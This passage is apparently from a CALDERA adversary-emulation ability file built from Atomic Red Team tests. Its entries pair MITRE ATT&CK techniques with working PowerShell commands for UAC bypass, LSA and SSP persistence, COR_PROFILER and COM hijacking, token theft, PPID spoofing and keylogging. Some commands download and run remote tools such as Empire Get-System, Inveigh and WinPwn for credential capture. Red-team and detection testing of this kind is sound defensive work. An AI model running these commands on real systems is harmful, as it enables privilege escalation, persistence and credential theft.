            "name": "Access Token Manipulation: Parent PID Spoofing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aa40e8fe704a97fb7f7a5a02e9334824",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "aa40e8fe704a97fb7f7a5a02e9334824"
    },
    "T1547.014__multiple__Active Setup__b45598708fd9e5b197cb58cf193f4778": {
        "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.014",
            "name": "Active Setup"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"StubPath\" -Force; Remove-ItemProperty \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Force",
                    "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b45598708fd9e5b197cb58cf193f4778",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b45598708fd9e5b197cb58cf193f4778"
    },
    "T1547.015__multiple__Boot or Logon Autostart Execution: Login Items__01a2ad691dfb47b11d050fab371718d2": {
        "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.015",
            "name": "Boot or Logon Autostart Execution: Login Items"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "mv -Force ~\\AppData\\Local\\Temp\\settings.json ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json; taskkill /F /IM \"calculator.exe\" > $null",
                    "command": "mv ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json ~\\AppData\\Local\\Temp\\settings.json; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\"; wt.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "01a2ad691dfb47b11d050fab371718d2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "01a2ad691dfb47b11d050fab371718d2"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__64430e7597668877a832b9d1e379c9f2": {
        "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Recurse -Force",
                    "command": "New-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null; New-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\" -Force -ErrorAction SilentlyContinue | Out-Null; $Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "64430e7597668877a832b9d1e379c9f2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "64430e7597668877a832b9d1e379c9f2"
    },
    "T1547.006__multiple__Boot or Logon Autostart Execution: Kernel Modules and Extensions__bdd0be771e2462e572e2ecfbe5bf2eb7": {
        "description": "The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named “comadmin.dat” and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.006",
            "name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$examplePath = Join-Path $env:windir \"system32\\Com\"; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; if (Test-Path $exampleFullPath) { Remove-Item $exampleFullPath -Force }",
                    "command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bdd0be771e2462e572e2ecfbe5bf2eb7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bdd0be771e2462e572e2ecfbe5bf2eb7"
    },
    "T1547.002__multiple__Authentication Package__7197a8fcd7e833f42251ee3eddaa87c1": {
        "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.002",
            "name": "Authentication Package"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\" /f; rm -force C:\\windows\\system32\\package.dll",
                    "command": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7197a8fcd7e833f42251ee3eddaa87c1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7197a8fcd7e833f42251ee3eddaa87c1"
    },
    "T1134.001__multiple__Access Token Manipulation: Token Impersonation/Theft__ae73a53476995f46b71f11709f525319": {
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ae73a53476995f46b71f11709f525319",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ae73a53476995f46b71f11709f525319"
    },
    "T1134.001__multiple__Access Token Manipulation: Token Impersonation/Theft__2cda9de49fe7ac16813a23d0741e9b28": {
        "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "taskkill /f /im notepad.exe",
                    "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; Start-Process .\\BadPotato.exe notepad.exe; Start-Sleep -Second 20; Stop-Process -Name \"notepad\" -force -erroraction silentlycontinue; Stop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2cda9de49fe7ac16813a23d0741e9b28",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2cda9de49fe7ac16813a23d0741e9b28"
    },
    "T1055.002__multiple__Process Injection: Portable Executable Injection__ca6a3f579181ea47b7d95779e8d8a79b": {
        "description": "This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.002",
            "name": "Process Injection: Portable Executable Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
                    "command": "Start-Process \"971b85_RedInjection.exe\"; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "971b85_RedInjection.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "ca6a3f579181ea47b7d95779e8d8a79b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ca6a3f579181ea47b7d95779e8d8a79b"
    },
    "T1134.002__multiple__Create Process with Token__163fd8a878476002c604d0fe4e32a419": {
        "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.002",
            "name": "Create Process with Token"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}; & \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "163fd8a878476002c604d0fe4e32a419",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "163fd8a878476002c604d0fe4e32a419"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__acf646b22c5d2c2b1058feb7da1f3bdc": {
        "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg.exe import \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\"; Remove-Item -Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" -Force",
                    "command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }; Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"autocheck autoche *\" -Type MultiString",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "acf646b22c5d2c2b1058feb7da1f3bdc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "acf646b22c5d2c2b1058feb7da1f3bdc"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__f782c9b7007a34343faec301b64e7435": {
        "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore",
                    "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f782c9b7007a34343faec301b64e7435",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f782c9b7007a34343faec301b64e7435"
    },
    "T1574.012__multiple__Hijack Execution Flow: COR_PROFILER__44c554d9bf01759c8a35c8ec8eb8510d": {
        "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.012",
            "name": "Hijack Execution Flow: COR_PROFILER"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
                    "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"83f016_T1574.012x64.dll\" -Force | Out-Null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "83f016_T1574.012x64.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "44c554d9bf01759c8a35c8ec8eb8510d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "44c554d9bf01759c8a35c8ec8eb8510d"
    },
    "T1557.001__multiple__Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay__5ee8fce78c4cef28c4e6ecebe77bdba4": {
        "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1557.001",
            "name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5ee8fce78c4cef28c4e6ecebe77bdba4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5ee8fce78c4cef28c4e6ecebe77bdba4"
    },
    "T1546.015__multiple__Event Triggered Execution: Component Object Model Hijacking__4e80b3c50bd1fff09f4cfd628f031149": {
        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore",
                    "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4e80b3c50bd1fff09f4cfd628f031149",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4e80b3c50bd1fff09f4cfd628f031149"
    },
    "T1078.003__multiple__Valid Accounts: Local Accounts__5ce7136a4547b0bf3ca074c94fb10b24": {
        "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.003",
            "name": "Valid Accounts: Local Accounts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); obfuskittiedump -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5ce7136a4547b0bf3ca074c94fb10b24",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5ce7136a4547b0bf3ca074c94fb10b24"
    },
    "T1056.001__multiple__Input Capture: Keylogging__a18a0e98b9566d92a1611a2da69b413b": {
        "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1056.001",
            "name": "Input Capture: Keylogging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore",
                    "command": "if (Test-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") { ; } else {New-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"};  ;  &\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath $env:TEMP\\key.log",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a18a0e98b9566d92a1611a2da69b413b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a18a0e98b9566d92a1611a2da69b413b"
    },
    "T1547.005__multiple__Boot or Logon Autostart Execution: Security Support Provider__bd9f08eb7c3215b8a6a7dd1af9ea406a": {
        "description": "Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.\nA common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.005",
            "name": "Boot or Logon Autostart Execution: Security Support Provider"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old'); Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value \"$oldvalue\"; Remove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old'; ",
                    "command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'); Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' -Value \"$oldvalue\"; $newvalue = \"AtomicTest.dll\"; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $newvalue",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bd9f08eb7c3215b8a6a7dd1af9ea406a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bd9f08eb7c3215b8a6a7dd1af9ea406a"
    },
    "T1134.004__multiple__Access Token Manipulation: Parent PID Spoofing__a515bb54fd6e14b78297814875f3c73b": {
        "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.004",
            "name": "Access Token Manipulation: Parent PID Spoofing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"calculator\" -ErrorAction Ignore; Stop-Process -Name \"iexplore\" -ErrorAction Ignore",
                    "command": ". \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"; $ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"8b38ee_calc.dll\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "8b38ee_calc.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "a515bb54fd6e14b78297814875f3c73b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a515bb54fd6e14b78297814875f3c73b"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__1f15ab22c39a9b6bb2bb0d77276dfcb3": {
        "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
